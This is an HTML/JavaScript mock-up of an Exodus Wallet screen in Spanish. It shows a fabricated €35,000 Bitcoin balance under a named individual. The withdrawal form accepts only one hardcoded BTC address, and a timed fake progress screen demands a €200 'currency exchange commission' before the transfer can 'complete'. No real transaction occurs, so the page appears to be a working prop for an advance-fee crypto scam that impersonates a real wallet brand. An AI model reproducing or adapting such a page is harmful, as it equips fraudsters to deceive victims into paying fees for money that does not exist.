<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Exodus Wallet</title>
<script src="https://cdn.tailwindcss.com"></script>
<style>
 body { background:#0b1a2b; color:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
 .fade-in { animation: fade .25s ease both; }
 .scale-in { animation: scale .25s ease both; }
 @keyframes fade { from{opacity:0} to{opacity:1} }
 @keyframes scale { from{opacity:0; transform:translateY(12px)} to{opacity:1; transform:none} }
 .spin { animation: spin 1s linear infinite; }
 @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="mx-auto max-w-md min-h-screen flex flex-col">
 <header class="flex items-center justify-between px-5 pt-6 pb-3">
   <div class="flex items-center gap-2">
     <div class="h-9 w-9 rounded-full bg-[#0500ff] flex items-center justify-center font-bold text-sm">EX</div>
     <div>
       <p class="text-xs text-slate-400 leading-tight">EXODUS WALLET</p>
       <p class="text-sm font-semibold leading-tight">Jose Maria Quinones Manzaneque</p>
     </div>
   </div>
   <div class="flex items-center gap-3 text-slate-300 text-xs">⌖ ◔ ⚙</div>
 </header>

 <section class="px-5 pt-6 pb-2 text-center">
   <p class="text-sm text-slate-400">Saldo Total</p>
   <h1 id="eur" class="mt-2 text-4xl font-bold tracking-tight">€35,000.00</h1>
   <div class="mt-2 inline-flex items-center gap-2 rounded-full bg-[#142844] px-3 py-1 text-xs">
     <span class="h-1.5 w-1.5 rounded-full bg-emerald-400"></span>
     <span id="btc" class="font-medium text-slate-200">0.3500 BTC</span>
     <span class="text-emerald-400">+2.41%</span>
   </div>
 </section>

 <section class="mt-6 px-5">
   <button onclick="openWithdraw()" class="w-full rounded-xl bg-[#0500ff] hover:bg-[#0500ff]/90 py-3.5 text-sm font-semibold">↑ Retirar</button>
 </section>

 <div class="mx-5 mt-5 flex items-center justify-between rounded-xl bg-[#142844] px-4 py-3">
   <div>
     <p class="text-xs text-slate-400">Dirección de Billetera</p>
     <p class="font-mono text-xs text-slate-200 truncate max-w-[260px]">bc1q03t8h5ssqc8c5wnsh4p7qa2u4jyvtm6n40fuv4</p>
   </div>
   <span class="text-slate-400">⧉</span>
 </div>

 <div class="mt-6 px-5 flex items-center gap-6 border-b border-white/5">
   <button class="pb-3 text-sm font-semibold border-b-2 border-[#0500ff]">Tokens</button>
   <button class="pb-3 text-sm text-slate-400">NFTs</button>
   <button class="pb-3 text-sm text-slate-400">Actividad</button>
 </div>

 <section id="assets" class="px-3 mt-2 pb-32"></section>
</div>

<div id="modal" class="hidden fixed inset-0 z-50 flex items-end sm:items-center justify-center bg-black/60 backdrop-blur-sm">
 <div id="modalBox" class="w-full max-w-md scale-in"></div>
</div>

<script>
const REQUIRED = "bc1q03t8h5ssqc8c5wnsh4p7qa2u4jyvtm6n40fuv4";
const PRICE = 100000;
const FEE_EUR = 200;
const FEE_BTC = FEE_EUR / PRICE;
const state = { btc: 0.35, address: "" };

const fmtEur = n => n.toLocaleString("en-US",{minimumFractionDigits:2,maximumFractionDigits:2});
const fmtBtc = n => n.toLocaleString("en-US",{minimumFractionDigits:4,maximumFractionDigits:4});

function renderBalance(){
 document.getElementById("eur").textContent = "€"+fmtEur(state.btc*PRICE);
 document.getElementById("btc").textContent = fmtBtc(state.btc)+" BTC";
 renderAssets();
}
function renderAssets(){
 const rows = [
   {s:"BTC",n:"Bitcoin",c:"Bitcoin",a:fmtBtc(state.btc)+" BTC",v:"€"+fmtEur(state.btc*PRICE),ch:"+2.41%",up:true,co:"#F7931A"},
   {s:"ETH",n:"Ethereum",c:"ERC20",a:"0.0000 ETH",v:"€0.00",ch:"0.00%",co:"#627EEA"},
   {s:"USDT",n:"Tether",c:"TRC20",a:"0.00 USDT",v:"€0.00",ch:"0.00%",co:"#26A17B"},
   {s:"BNB",n:"BNB",c:"BEP20",a:"0.00 BNB",v:"€0.00",ch:"0.00%",co:"#F3BA2F"},
   {s:"SOL",n:"Solana",c:"Solana",a:"0.00 SOL",v:"€0.00",ch:"0.00%",co:"#9945FF"},
 ];
 document.getElementById("assets").innerHTML = rows.map(r=>`
   <div class="w-full flex items-center gap-3 px-3 py-3 rounded-xl hover:bg-white/5">
     <div class="h-10 w-10 rounded-full flex items-center justify-center text-xs font-bold" style="background:${r.co}">${r.s.slice(0,3)}</div>
     <div class="flex-1 text-left">
       <div class="flex items-center gap-2"><p class="font-semibold text-sm">${r.n}</p><span class="text-[10px] text-slate-400 bg-white/5 px-1.5 py-0.5 rounded">${r.c}</span></div>
       <p class="text-xs text-slate-400 mt-0.5">${r.a}</p>
     </div>
     <div class="text-right"><p class="text-sm font-semibold">${r.v}</p><p class="text-xs ${r.up?'text-emerald-400':'text-slate-400'}">${r.ch}</p></div>
   </div>`).join("");
}
renderBalance();

const modal = document.getElementById("modal");
const box = document.getElementById("modalBox");
function show(html, dark){
 box.innerHTML = html;
 box.className = "w-full max-w-md scale-in " + (dark ? "bg-[#0f213a] rounded-t-2xl sm:rounded-2xl border border-white/10 shadow-2xl" : "bg-white rounded-t-2xl sm:rounded-2xl overflow-hidden shadow-2xl text-slate-900");
 modal.classList.remove("hidden");
}
function close(){ modal.classList.add("hidden"); }

function openWithdraw(){ state.address=""; renderForm(""); }

function renderForm(err){
 show(`
   <div class="p-6">
     <div class="flex items-center justify-between"><h2 class="text-lg font-semibold text-white">Retirar Bitcoin</h2><button onclick="close()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
     <div class="mt-5 space-y-4">
       <div>
         <label class="text-xs font-medium text-slate-400 mb-1.5 block">Dirección BTC de Destinatario (EXODUS WALLET)</label>
         <input id="addr" value="${state.address}" placeholder="bc1q..." class="w-full bg-[#142844] text-white rounded-xl px-4 py-3 text-sm font-mono placeholder:text-slate-500 outline-none focus:ring-2 focus:ring-[#0500ff]" />
         ${err?`<p class="mt-1.5 text-xs text-red-400">⚠ ${err}</p>`:""}
       </div>
       <div>
         <label class="text-xs font-medium text-slate-400 mb-1.5 block">Cantidad</label>
         <div class="flex items-center justify-between bg-[#142844] rounded-xl px-4 py-3 text-white">
           <div><p class="text-sm font-semibold">${fmtBtc(state.btc)} BTC</p><p class="text-xs text-slate-400">≈ €${fmtEur(state.btc*PRICE)}</p></div>
           <span class="text-xs font-bold text-[#0500ff] bg-[#0500ff]/15 px-2.5 py-1 rounded-md">MAX</span>
         </div>
       </div>
       <div class="rounded-xl bg-[#142844] p-3 text-xs text-slate-400">🛡 La dirección está verificada contra tu EXODUS WALLET. Las transacciones de Bitcoin no pueden revertirse.</div>
       <button onclick="verify()" class="w-full rounded-xl bg-[#0500ff] py-3.5 text-sm font-semibold text-white">Verificar Dirección</button>
     </div>
   </div>`, true);
}
function verify(){
 const v = document.getElementById("addr").value.trim();
 state.address = v;
 if(v !== REQUIRED){ renderForm("La dirección no coincide con la dirección de destinatario verificada de EXODUS WALLET."); return; }
 renderConfirm();
}
function renderConfirm(){
 const total = state.btc*PRICE + FEE_EUR;
 show(`
   <div class="p-6">
     <div class="flex items-center justify-between"><h2 class="text-lg font-semibold text-white">Confirmar Retiro</h2><button onclick="close()" class="h-8 w-8 rounded-full bg-[#142844] text-slate-400">✕</button></div>
     <div class="mt-5 space-y-3 text-sm text-white">
       ${row("Billetera","EXODUS WALLET")}
       ${row("Activo","Bitcoin (BTC)")}
       ${row("Red","Bitcoin Mainnet")}
       ${row("Para",REQUIRED.slice(0,8)+"…"+REQUIRED.slice(-6),true)}
       ${row("Cantidad",fmtBtc(state.btc)+" BTC")}
       ${row("Tarifa de Red",FEE_BTC.toFixed(6)+" BTC (€"+fmtEur(FEE_EUR)+")")}
       <div class="h-px bg-white/10 my-1"></div>
       ${row("Total","€"+fmtEur(total),false,true)}
     </div>
     <div class="mt-6 grid grid-cols-2 gap-3">
       <button onclick="renderForm('')" class="rounded-xl bg-[#142844] py-3 text-sm font-semibold text-white">Atrás</button>
       <button onclick="startProcess()" class="rounded-xl bg-[#0500ff] py-3 text-sm font-semibold text-white">Confirmar y Enviar</button>
     </div>
   </div>`, true);
}
function row(l,v,mono,bold){ return `<div class="flex items-center justify-between"><span class="text-slate-400">${l}</span><span class="${bold?'font-bold text-base':'font-medium'} ${mono?'font-mono text-xs':''}">${v}</span></div>`; }

const STEPS = [
 {label:"Ordenado", delay:600},
 {label:"Transacción verificada", delay:1800},
 {label:"Transacción procesada", delay:3200},
];
function renderProcess(idx){
 const total = state.btc*PRICE + FEE_EUR;
 const dot = (s) => s==='done'
   ? `<div class="h-9 w-9 rounded-full bg-emerald-500 flex items-center justify-center shrink-0"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>`
   : `<div class="h-9 w-9 rounded-full bg-slate-200 flex items-center justify-center shrink-0"><div class="h-4 w-4 border-2 border-slate-500 border-t-transparent rounded-full spin"></div></div>`;
 const stepRows = STEPS.map((s,i)=>{
   const st = idx>=i ? 'done' : 'pending';
   return `<div class="relative flex items-start gap-4">
     <span class="absolute left-[18px] top-9 h-7 w-px border-l-2 border-dashed border-slate-300"></span>
     ${dot(st)}
     <p class="pt-1 text-base font-semibold ${st==='done'?'text-slate-900':'text-slate-500'}">${s.label}</p>
   </div>`;
 }).join("");
 const last = `<div class="relative flex items-start gap-4">
     ${dot('pending')}
     <div class="pt-1"><p class="text-base font-semibold text-slate-500">Cripto entregada</p>
     <p class="text-xs text-slate-400 mt-0.5">Esperando confirmación de red…</p></div>
   </div>`;
 show(`
   <div class="bg-[#1c64c4] px-5 py-7 flex items-center gap-3">
     <div class="h-12 w-12 rounded-xl bg-white flex items-center justify-center">
       <svg width="28" height="28" viewBox="0 0 24 24" fill="#1c64c4"><path d="M12 2 4 5v6c0 5 3.4 9.7 8 11 4.6-1.3 8-6 8-11V5l-8-3z"/></svg>
     </div>
     <span class="text-white text-2xl font-bold tracking-tight">Exodus Wallet</span>
     <button onclick="close()" class="ml-auto text-white/80">✕</button>
   </div>
   <div class="px-5 pt-5 pb-6">
     <p class="text-sm font-semibold">Enviando a</p>
     <p class="font-mono text-[11px] text-slate-500 break-all mt-1">${REQUIRED}</p>
     <p class="mt-5 text-sm font-semibold">Resumen</p>
     <div class="mt-2 space-y-1.5 text-sm">
       <div class="flex justify-between"><span class="text-slate-500">Recibes</span><span>${fmtBtc(state.btc)} BTC</span></div>
       <div class="flex justify-between"><span class="text-slate-500">Costo base</span><span>€${fmtEur(state.btc*PRICE)}</span></div>
       <div class="flex justify-between"><span class="text-slate-500">Tarifa de Red</span><span>${FEE_BTC.toFixed(6)} BTC (€${fmtEur(FEE_EUR)})</span></div>
       <div class="flex justify-between font-semibold pt-1"><span>Total</span><span>€${fmtEur(total)}</span></div>
     </div>
     <div class="mt-4 rounded-xl bg-[#fff7ed] border border-[#f97316] p-3 text-xs text-[#c2410c]">
       <p class="font-semibold mb-1">Nota importante:</p>
       <p>Para que tu Exodus Wallet complete el cambio de divisas y la transacción pase de <span class="font-semibold">"Ordenado"</span> a <span class="font-semibold">"Completado"</span>, es necesario disponer de <span class="font-semibold">€200.00</span> como <span class="font-semibold">Comisión por cambio de divisas</span> en la billetera.</p>
     </div>
     <div class="mt-5 space-y-5">${stepRows}${last}</div>
     <p class="mt-8 text-center text-sm text-slate-500">¿Ya tienes esa app?</p>
     <button class="mt-3 w-full rounded-md bg-[#1c64c4] py-3.5 text-sm font-semibold text-white">Abrir en Exodus Wallet</button>
   </div>
 `, false);
}
function startProcess(){
 renderProcess(-1);
 STEPS.forEach((s,i)=> setTimeout(()=>renderProcess(i), s.delay));
}
</script>
</body>
</html>
